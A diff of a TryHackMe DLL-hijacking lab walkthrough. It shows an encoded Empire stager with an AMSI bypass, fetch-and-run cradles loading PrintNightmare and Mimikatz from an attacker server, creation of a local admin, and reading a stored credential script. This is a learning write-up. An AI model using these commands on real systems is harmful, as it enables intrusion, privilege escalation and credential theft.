@@ -3,7 +3,7 @@
 <em>DLL HIJACKING with Invoke-PrintDemon</em>.<br>
 <img width="80px" src="https://github.com/user-attachments/assets/68c7ee07-537b-4bd9-a0a9-7bfa4f17df73"><br>
 Access this walkthrough room clicking <a href="https://tryhackme.com/room/dllhijacking">here </a>.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/194cbd98-9b89-4f50-9162-bafc90dd82b9"></p>
+<img width="1200px" src="https://github.com/user-attachments/assets/debf9d44-0019-44da-9ffb-f6f6e6ff37f2"></p>
 
 <br>
 <h2>Task 1 . Overview of DLL Hijacking</h2>
@@ -505,10 +505,10 @@ Options:
 (Empire: stager/multi/launcher) > execute
 powershell -noP -sta -w 1 -enc  SQBGACgAJAB....
 (Empire: stager/multi/launcher) > 
-[*] Sending POWERSHELL stager (stage 1) to 10.201.81.79
+[*] Sending POWERSHELL stager (stage 1) to xx.xxx.xx.xx
 [*] New agent BXZN97UL checked in
-(Empire: stager/multi/launcher) > [+] Initial agent BXZN97UL from 10.201.81.79 now active (Slack)
-[*] Sending agent (stage 2) to BXZN97UL at 10.201.81.79
+(Empire: stager/multi/launcher) > [+] Initial agent BXZN97UL from xx.xxx.xx.xx now active (Slack)
+[*] Sending agent (stage 2) to BXZN97UL at xx.xxx.xx.xx
 (Empire: stager/multi/launcher) > 
 ```
 
@@ -523,8 +523,8 @@ main
 
  Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
  ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
- 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 23:55:49  http            
- BXZN97UL ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         3608   5/0.0    2025-09-18 00:34:10  http   
+ 32H68BSD ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         4976   5/0.0    2025-09-17 xx:xx:xx  http            
+ BXZN97UL ps 0.0.0.0         DESKTOP-E920628   DESKTOP-E920628\Sam     powershell         3608   5/0.0    2025-09-18 xx:xx:xx  http   
 ```
 
 ```bash
@@ -533,10 +533,6 @@ main
 (Empire: powershell/privesc/printdemon) > set LauncherCode ....
 (Empire: powershell/privesc/printdemon) > execute
 ```
-
-<img width="1239" height="156" alt="image" src="https://github.com/user-attachments/assets/31000402-19b8-42f7-930b-c32c93190d9f" />
-
-
 
 ```bash
 :~/DLLHijacking# evil-winrm -i TargetIP -u Sam
@@ -552,14 +548,13 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Sam\Documents> powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBpAE...8AUgAgAC0ARwBFACAAMwApAHsAJABiADcAZgA0AD0AWwByAEUAZgBdAC4AQQBTAFMAZQBtAGIAbABZAC4ARwBFAHQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAGIANwBmADQAKQB7ACQAYgAzADkAOQA9ACQAQgA3AGYANAAuAEcARQB0AFYAQQBMAFUAZQAoACQATgB1AGwATAApADsASQBGACgAJABCADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYgAzADkAOQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABCADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMATwBsAGwARQBDAHQASQBvAE4AcwAuAEcARQBuAGUAUgBJAEMALgBEAEkAQwBUAGkATwBuAEEAcgBZAFsAcwBUAHIASQBOAGcALABTAHkAUwB0AEUAbQAuAE8AQgBKAEUAQwB0AF0AXQA6ADoAbgBFAFcAKAApADsAJAB2AGEAbAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAMwA5ADkAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAGwAcwBFAHsAWwBTAGMAcgBpAHAAVABCAEwAbwBjAGsAXQAuACIARwBFAHQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUARQAoACQATgBVAGwAbAAsACgATgBFAFcALQBPAGIAagBFAGMAdAAgAEMATwBsAGwARQBDAHQAaQBvAE4AcwAuAEcAZQBOAEUAUgBpAGMALgBIAGEAUwBIAFMARQB0AFsAcwBUAHIASQBuAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAGUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAEUAdABGAEkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQAbgBVAGwATAAsACQAdAByAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAGUAVAAuAFMARQByAFYASQBDAGUAUABvAEkATgB0AE0AQQBuAEEARwBFAFIAXQA6ADoARQB4AFAARQBDAHQAMQAwADAAQwBPAG4AdABpAE4AdQBFAD0AMAA7ACQARQBiAGQARAA9AE4AZQBXAC0ATwBiAGoAZQBDAHQAIABTAFkAcwB0AGUATQAuAE4ARQBUAC4AVwBFAGIAQwBsAGkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcARQBUAFMAVAByAEkATgBHACgAWwBDAE8AbgBWAGUAcgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHkAQQBEAEEAQQBNAFEAQQB1AEEARABNAEEATABnAEEAeABBAEQARQBBAE4AQQBBADYAQQBEAFEAQQBPAFEAQQAxAEEAQQA9AD0AJwApACkAKQA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARQBCAGQARAAuAEgARQBBAEQAZQBSAFMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAGUAYgBEAGQALgBQAHIAbwBYAFkAPQBbAFMAeQBTAFQARQBNAC4ATgBFAHQALgBXAEUAYgBSAEUAcQBVAEUAcwBUAF0AOgA6AEQARQBmAEEAVQBMAFQAVwBlAGIAUABSAE8AeABZADsAJABFAGIARABkAC4AUAByAE8AWAB5AC4AQwByAGUAZABFAE4AdABpAGEAbABzACAAPQAgAFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAEMAcgBFAEQARQBOAHQASQBhAEwAQwBhAGMASABlAF0AOgA6AEQARQBmAEEAVQBsAHQATgBlAFQAdwBPAHIAawBDAHIARQBEAGUAbgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAZQBiAGQAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAG0ALgBUAEUAWABUAC4ARQBOAEMATwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AGUAcwAoACcAYQB3AFgAVQBEAGsAaQB0ADwAbwBWADkASgBjAFIATwBMAHsAJQBnAFEALgB8ADMAbgBIAHEATQBwAEEALwBsACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAZQBiAEQAZAAuAEgARQBhAEQARQBSAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIATABHAGMAbQBHAE4AYwBCAEUAPQBRAHEAWABSAEwANgBjAEYATwBRAEgARABzAE8AcwBLAE8AYwBjAGgAUwB1AHoAMQBhAEYAbwA9ACIAKQA7ACQARABhAHQAQQA9ACQAZQBiAEQARAAuAEQATwBXAG4ATABPAEEAZABEAGEAVABhACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AEEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAYQB0AEEALgBsAGUATgBHAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
 
-
 ```bash
 [+] Print Job Started on PrintDemon
 [+] Completed registry persistence, waiting on system restart...
 (Empire: powershell/privesc/printdemon) > 
 [*] Sending POWERSHELL stager (stage 1) to TargetIP
 [*] New agent 94G678XN checked in
-[+] Initial agent 94G678XN from 10.201.72.205 now active (Slack)
+[+] Initial agent 94G678XN from xx.xxx.xx.xxx now active (Slack)
 [*] Sending agent (stage 2) to 94G678XN at TargetIP
 (Empire: powershell/privesc/printdemon) > agents
 
@@ -584,12 +579,7 @@ Restarting computer
 [*] New agent PNW1B8Y3 checked in
 [+] Initial agent PNW1B8Y3 from 10.201.72.205 now active (Slack)
 [*] Sending agent (stage 2) to PNW1B8Y3 at TargetIP
-
 ```
-
-```bash
-https://github.com/BC-SECURITY/Invoke-PrintDemon/blob/master/Invoke-PrintDemon.ps1
-```         
 
 <br>
 <h2>Task 9 . Network Persistence</h2>
@@ -615,14 +605,190 @@ https://github.com/BC-SECURITY/Invoke-PrintDemon/blob/master/Invoke-PrintDemon.p
 
 <img width="873" height="218" alt="image" src="https://github.com/user-attachments/assets/4d69298b-e7f7-4c7f-a515-9616073c6c6e" />
 
+```bash
+:~/DLLHijacking# wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
+```
+
+```bash
+:~/DLLHijacking# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+xx.xxx.xx.xx - - [17/Sep/2025 xx:xx:xx] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\Sam\Documents> iex (iwr -usebasicparsing http://xx.xx.xx.xxx:8000/CVE-2021-1675.ps1)
+*Evil-WinRM* PS C:\Users\Sam\Documents> invoke-nightmare
+[+] using default new user: *****
+[+] using default new password: ********
+[+] created payload at C:\Users\Sam\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_17a1dc11390402e0\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\Sam\AppData\Local\Temp\nightmare.dll
+*Evil-WinRM* PS C:\Users\Sam\Documents> 
+```
+
+```bash
+:~/DLLHijacking# evil-winrm -i xx.xxx.xx.xx -u ***** -p ********
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\*****\Documents> 
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\*****\Documents> whoami
+desktop-e920628\*****
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\*****\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+desktop-e920628\***** S-*-*-**-**********-**********-**********-****
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-*-*-*      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-*-*-***    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-*-*-**-*** Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-*-*-**-*** Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                          Well-known group S-*-*-*      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-*-*-**     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-*-*-**     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-*-*-***    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-*-*-**-**  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level                          Label            S-*-**-*****
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State
+=============================== ========================================= =======
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
+SeSecurityPrivilege             Manage auditing and security log          Enabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
+SeLoadDriverPrivilege           Load and unload device drivers            Enabled
+SeSystemProfilePrivilege        Profile system performance                Enabled
+SeSystemtimePrivilege           Change the system time                    Enabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled
+SeBackupPrivilege               Back up files and directories             Enabled
+SeRestorePrivilege              Restore files and directories             Enabled
+SeShutdownPrivilege             Shut down the system                      Enabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
+SeUndockPrivilege               Remove computer from docking station      Enabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
+SeTimeZonePrivilege             Change the time zone                      Enabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
+
+*Evil-WinRM* PS C:\Users\adm1n\Documents> 
+```
+
+```bash
+:~/DLLHijacking# wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\*****\Documents> iex (iwr -usebasicparsing http://xx.xxx.xx.xxx:8000/Invoke-Mimikatz.ps1)
+```
+
+```bash
+:~/DLLHijacking# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+xx.xxx.xx.xx - - [17/Sep/2025 xx:xx:xx] "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
+```
+
+```bash
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/17/2025   5:46 PM                *****
+d-----        5/29/2020   7:12 PM                xxxx
+d-r---        5/29/2020   8:04 PM                Public
+d-----        5/29/2020   9:02 PM                Sam
+
+
+*Evil-WinRM* PS C:\Users> cd xxxx
+*Evil-WinRM* PS C:\Users\xxxx> dir
+
+
+    Directory: C:\Users\xxxx
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/29/2020   7:12 PM                3D Objects
+d-r---        5/29/2020   7:12 PM                Contacts
+d-r---        5/29/2020   9:40 PM                Desktop
+d-r---        5/29/2020  11:19 PM                Documents
+d-r---        5/29/2020   7:12 PM                Downloads
+d-r---        5/29/2020   7:12 PM                Favorites
+d-r---        5/29/2020   7:12 PM                Links
+d-r---        5/29/2020   7:12 PM                Music
+d-r---        5/29/2020   9:08 AM                OneDrive
+d-r---        5/29/2020   7:12 PM                Pictures
+d-r---        5/29/2020   7:12 PM                Saved Games
+d-r---        5/29/2020   7:12 PM                Searches
+d-r---        5/29/2020  11:18 PM                Videos
+
+
+*Evil-WinRM* PS C:\Users\xxxx> cd Desktop
+*Evil-WinRM* PS C:\Users\xxxx\Desktop> dir
+
+
+    Directory: C:\Users\xxxx\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        5/29/2020   7:13 PM           1446 Microsoft Edge.lnk
+-a----        5/29/2020   5:33 PM            365 startscript.ps1
+
+
+*Evil-WinRM* PS C:\Users\xxxx\Desktop> 
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\xxxx\Desktop> type startscript.ps1
+$pwd1 = "******************"
+$user = 'xxxx'
+$pwd = ConvertTo-SecureString -String $pwd1 -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Credential $Credential -WorkingDirectory "C:\Windows\System32\WindowsPowerShell\v1.0\"
+*Evil-WinRM* PS C:\Users\xxxx\Desktop> 
+```
+
 <br>
 
 <h2>Task 11 . Bonus Points: Steal Admin Credentials</h2>
 
 <p><em>Answer the question below</em></p>
 
-<p>11.1. x<br>
-<code>No answer needed</code></p>
+<p>11.1. What is the other user´s password?<br>
+<code>******************</code></p>
 
 <br>
 
@@ -630,41 +796,71 @@ https://github.com/BC-SECURITY/Invoke-PrintDemon/blob/master/Invoke-PrintDemon.p
 
 <p><em>Answer the question below</em></p>
 
-<p>12.1. x<br>
+<p>12.1. #HackThePlanet<br>
 <code>No answer needed</code></p>
 
 <br>
 <br>
 
 
-<br>
-<br>
-
 <h1 align="center">Completed</h1>
-<p align="center"><img width="1200px" src=""><br>
-                  <img width="1200px" src="https://github.com/user-attachments/assets/03df01d9-f671-4e41-b565-a4db54d2013c"></p>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/94e1e1a6-4cf5-4c09-b77b-289ebb6871f9"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/549e90e6-0a7d-48d5-900a-587ba202a2f7"></p>
 
 
 <br>
 
-<h1 align="center">My TryHackMe Journey</h1>
+<h1 align="center">My TryHackMe Journey ・ 2025, September</h1>
 
-<div align="center">
+<div align="center"><h6>
 
-| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
-| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
-|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
-| 2025, August 7    |   458    |     131ˢᵗ    |      5ᵗʰ     |     677ᵗʰ   |    16ᵗʰ    | 119,558  |    902    |    73     |
+| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
+|:------:|:--------------------------------------|--------:|------------:|-------------:|------------:|------------:|------------:|------------:|------------:|
+|17      |Medium 🔗 - <code><strong>DLL Hijacking</strong></code>| 499| 106ᵗʰ| 4ᵗʰ      |     348ᵗʰ   |     7ᵗʰ    | 126,554  |    969    |    75     |
+|17      |Medium 🔗 - The Docker Rodeo           | 499    |     106ᵗʰ    |      4ᵗʰ     |     346ᵗʰ   |     7ᵗʰ    | 126,546  |    968    |    75     |
+|17      |Easy 🔗 - Linux Logging for SOC        | 499    |     106ᵗʰ    |      4ᵗʰ     |     345ᵗʰ   |     7ᵗʰ    | 126,538  |    967    |    74     |
+|16      |Hard 🚩 - TryHack3M: TriCipher Summit  | 498    |     107ᵗʰ    |      4ᵗʰ     |     364ᵗʰ   |     7ᵗʰ    | 126,420  |    966    |    74     |
+|16      |Easy 🔗 - Chaining Vulnerabilities     | 498    |     108ᵗʰ    |      5ᵗʰ     |     365ᵗʰ   |     7ᵗʰ    | 126,420  |    965    |    74     |
+|15      |Medium 🔗 - AppSec IR                  | 497    |     108ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     7ᵗʰ    | 126,404  |    964    |    74     |
+|14      |Hard 🚩 - Misguided Ghosts, in progress| 496    |     108ᵗʰ    |      5ᵗʰ     |     389ᵗʰ   |     6ᵗʰ    | 126,300  |    963    |    74     |
+|14      |Hard 🚩 - VulnNet: Endgame             | 496    |     108ᵗʰ    |      5ᵗʰ     |     394ᵗʰ   |     6ᵗʰ    | 126,270  |    963    |    74     |
+|13      |Hard 🚩 - Royal Router                 | 495    |     107ᵗʰ    |      5ᵗʰ     |     388ᵗʰ   |     6ᵗʰ    | 126,160  |    962    |    74     |
+|13      |Medium 🚩 - Void Execution             | 495    |     107ᵗʰ    |      5ᵗʰ     |     383ʳᵈ   |     6ᵗʰ    | 126,120  |    961    |    73     |
+|12      |Easy 🚩 - Invite Only                  | 494    |     110ᵗʰ    |      5ᵗʰ     |     352ⁿᵈ   |     6ᵗʰ    | 126,056  |    960    |    73     |
+|12      |Medium 🚩 - Devie                      | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ   |     9ᵗʰ    | 125,606  |    959    |    73     |
+|11      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
+|11      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ   |     9ᵗʰ    | 125,516  |    958    |    73     |
+|10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ   |     9ᵗʰ    | 125,428  |    957    |    73     |
+|10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ   |     9ᵗʰ    | 125,292  |    956    |    73     |
+|9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ   |     9ᵗʰ    | 125,236  |    955    |    73     |
+|9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ   |    10ᵗʰ    | 125,146  |    954    |    73     |
+|9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ   |    10ᵗʰ    | 125,016  |    953    |    73     |
+|8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
+|8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
+|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
+|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
+|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
+|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
+|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
+|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
+|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
+|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
+|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
+|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
+|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	     5ᵗʰ    |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
+|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
+|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
+|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
 
-
-</div>
-
-<p align="center">Global All Time:   131ˢᵗ<br><img width="250px" src=""><br>
-                                              <img width="1200px" src=""><br><br>
-                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src=""><br>
-                  Global monthly:    664ᵗʰ<br><img width="1200px" src=""><br>
-                  Brazil monthly:     16ᵗʰ<br><img width="1200px" src=""><br>
+</h6></div><br>
 
 <br>
-<h1 align="center">Thanks for Coming!</h1>
-<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
+
+<p align="center">Global All Time:   106ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/1391de71-f916-4ec5-afd6-a3835dbb72d1"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/a2bcdcaa-15da-48eb-addc-ca54e42e1823"><br><br>
+                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/630ca342-2fe3-41a7-9673-7bda964badec"><br>
+                  Global monthly:    348ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f935949c-d0a8-4442-95e2-8bb03859d0ff"><br>
+                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/9304673e-2213-4e6e-9542-f2c73984aed0"><br>
+
+<h1 align="center">Thanks for coming!</h1>
